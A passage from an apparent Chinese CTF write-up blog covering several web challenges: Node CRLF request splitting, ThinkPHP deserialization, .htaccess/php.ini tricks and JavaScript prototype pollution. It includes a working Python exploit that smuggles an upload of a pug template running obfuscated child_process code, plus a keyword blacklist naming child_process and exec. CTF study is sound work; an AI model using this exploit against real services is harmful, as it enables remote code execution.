class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    resp.on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">&quot;ECONNRESET&quot;</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">&quot;Timeout occurs&quot;</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>,<span class="string">&quot;mainModule&quot;</span>,<span class="string">&quot;require&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;child_process&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;!&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>审计源码，我们可以得到我们想要的是进入file_upload目录下传个文件。题目是引入了pug插件的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;xiaohuochai&#x2F;p&#x2F;7222227.html</span><br></pre></td></tr></table></figure>

<p>该插件允许插入JS代码，也可以直接允许JS</p>
<p>CRLF的问题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2894</span><br></pre></td></tr></table></figure>





<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /file_upload HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;&quot;&quot;&quot;</span>.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">body = <span class="string">&quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUt</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lethe.pug&quot;</span></span><br><span class="line"><span class="string">Content-Type: ../template</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span></span><br><span class="line"><span class="string">-return x</span></span><br><span class="line"><span class="string">------WebKitFormBoundarysAs7bV3fMHq0JXUt--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.<span class="built_in">format</span>(<span class="built_in">len</span>(body), body) \</span><br><span class="line">    .replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;\u012b&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\u0120&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&#x27;\r\n&#x27;</span>, <span class="string">&#x27;\u010d\u010a&#x27;</span>)    \</span><br><span class="line">    .replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\u0122&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;\u0a27&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\u015b&#x27;</span>)             \</span><br><span class="line">    .replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\u015d&#x27;</span>) \</span><br><span class="line">    + <span class="string">&#x27;GET&#x27;</span> + <span class="string">&#x27;\u0120&#x27;</span> + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">requests.get(</span><br><span class="line">    <span class="string">&#x27;http://0cf1e7a3-8f19-4b14-be8b-65ec8fd4fc84.node3.buuoj.cn/core?q=&#x27;</span> + payload)</span><br><span class="line"></span><br><span class="line">print(requests.get(</span><br><span class="line">    <span class="string">&#x27;http://0cf1e7a3-8f19-4b14-be8b-65ec8fd4fc84.node3.buuoj.cn/?action=lethe&#x27;</span>).text)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯Upload</title>
    <url>/2021/05/14/%E5%BC%BA%E7%BD%91%E6%9D%AFUpload/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
<li>Thinkphp5反序列化</li>
<li>Phar</li>
</ul>
<h1 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h1><p> 反序列化的触发，找unserialize，发现很巧</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $profile=cookie(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">&#x27;user&#x27;</span>)-&gt;where(<span class="string">&quot;ID&quot;</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>这直接反序列化触发了，那么再找个login_check的触发点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">&quot;http://&quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>].$_SERVER[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">        <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Forbidden type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">&#x27;Unknow file type!&#x27;</span>, url(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>注册的时候就可以触发，呃，我以为是打原生链子，结果好像不是</p>
]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>XNUCA2019QualifierEasyPHP</title>
    <url>/2021/05/12/XNUCA2019QualifierEasyPHP/</url>
    <content><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><p>先来看看php.ini和.htaccess的区别</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.orcode.com&#x2F;question&#x2F;483978_kadb02.html</span><br></pre></td></tr></table></figure>

<p>也即是我们上传一个可以影响我们自己。但是.htaccess也只不过是apache2配置中的一个模块，php.ini中的配置是隶属于apache.conf当中的</p>
<p>故我们想要修改什么的话直接看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;ini.list.php</span><br></pre></td></tr></table></figure>

<p><strong>htaccess生效</strong></p>
<p>如果尝试上传htaccess文件会发现出现响应500的问题，因为文件尾有Just one chance 这里采用# \的方式将换行符转义成普通字符，就可以用#来注释单行了。</p>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h2><p>题目是放出源码的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&quot;fl3g.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nJust one chance&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>而我们知道包含了f13g.php， 由于每次访问都会删除我们的文件，所以我们其实不能直接写入f13g.php，那么我们想想还有什么可以做？</p>
<p>根据师傅的WP，我们可以在php.ini的配置中找到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;ini.core.php#ini.include-path</span><br></pre></td></tr></table></figure>

<p>看下翻译</p>
<p><img src="XNUCA2019QualifierEasyPHP/image-20210512215117627.png" alt="image-20210512215117627"></p>
<p>意思是修改之后当我们进行include的操作时，会优先看我们指定的配置路径，之后再回来</p>
<p>可是这又有什么用呢，我们怎么办去控制写入的路径文件呢</p>
<p>咋都复现不出来，玩尼玛</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;20175211lyz&#x2F;p&#x2F;11740901.html#1%E3%80%81error_log%E7%BB%93%E5%90%88log_errors%E8%87%AA%E5%AE%9A%E4%B9%89%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97</span><br></pre></td></tr></table></figure>





<p>随便找个地方放一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> python2 -m SimpleHTTPServer  <span class="number">8001</span></span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>文件上传</tag>
        <tag>PHP.INI</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎2020Notes</title>
    <url>/2021/05/13/%E7%BD%91%E9%BC%8E2020Notes/</url>
    <content><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul>
<li>JS原型链污染</li>
<li>undefsafe 的CVE</li>
</ul>
<p>关于原型链：</p>
<p>其实原型链这个东西如果接触过js的开发就可以明白了，Javascript是没有类的概念的，有的只有一个继承链一样的东西，所有的继承链最终又会指向Object，这种特性导致了一种情况，当用户可以赋值的时候若其对上级赋值，便可以直接导致同级，或者下级的所有对象都拥有了这个属性，具体实际例子如下：</p>
<p><img src="%E7%BD%91%E9%BC%8E2020Notes/image-20210513174107203.png" alt="image-20210513174107203"></p>
<p><img src="%E7%BD%91%E9%BC%8E2020Notes/image-20210513180128523.png" alt="image-20210513180128523"></p>
<p>两张图就很清晰的表达了他们之间的关系，当通过</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">__proto__ </span><br></pre></td></tr></table></figure>

<p>赋值的时候便会自动的向上级属性进行一个赋值，那么在这种情况下，我们请求一个对象的属性的时候，若其拥有属性，便会优先输出它的值，若其没有，则会根据原型链向父类请求~，而所有的函数的最上级都是Oboject，换句话说，只要能够控制Oboject的值，实际上也就可以污染所有的成员属性了。</p>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>那么回到题目，题目是放出源码的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.owner = <span class="string">&quot;whoknows&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">write_note</span>(<span class="params">author, raw_note</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.note_list[(<span class="built_in">this</span>.num++).toString()] = &#123;<span class="string">&quot;author&quot;</span>: author,<span class="string">&quot;raw_note&quot;</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">get_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="built_in">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">edit_note</span>(<span class="params">id, author, raw</span>)</span> &#123;</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.author&#x27;</span>, author);</span><br><span class="line">        undefsafe(<span class="built_in">this</span>.note_list, id + <span class="string">&#x27;.raw_note&#x27;</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">get_all_notes</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">remove_note</span>(<span class="params">id</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="built_in">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">&quot;nobody&quot;</span>, <span class="string">&quot;this is nobody&#x27;s first note&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;Notebook&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/add_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&#x27;please use POST to add a note&#x27;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;add note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;did not add note&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/edit_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to edit a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note sucess&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;edit note failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/delete_note&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;please use POST to delete a note&quot;</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete done&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">&#x27;mess&#x27;</span>, &#123;<span class="attr">message</span>: <span class="string">&quot;delete failed&quot;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/notes&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">&#x27;note&#x27;</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">&#x27;/status&#x27;</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">&#x27;Sorry cant find that!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">&#x27;Something broke!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



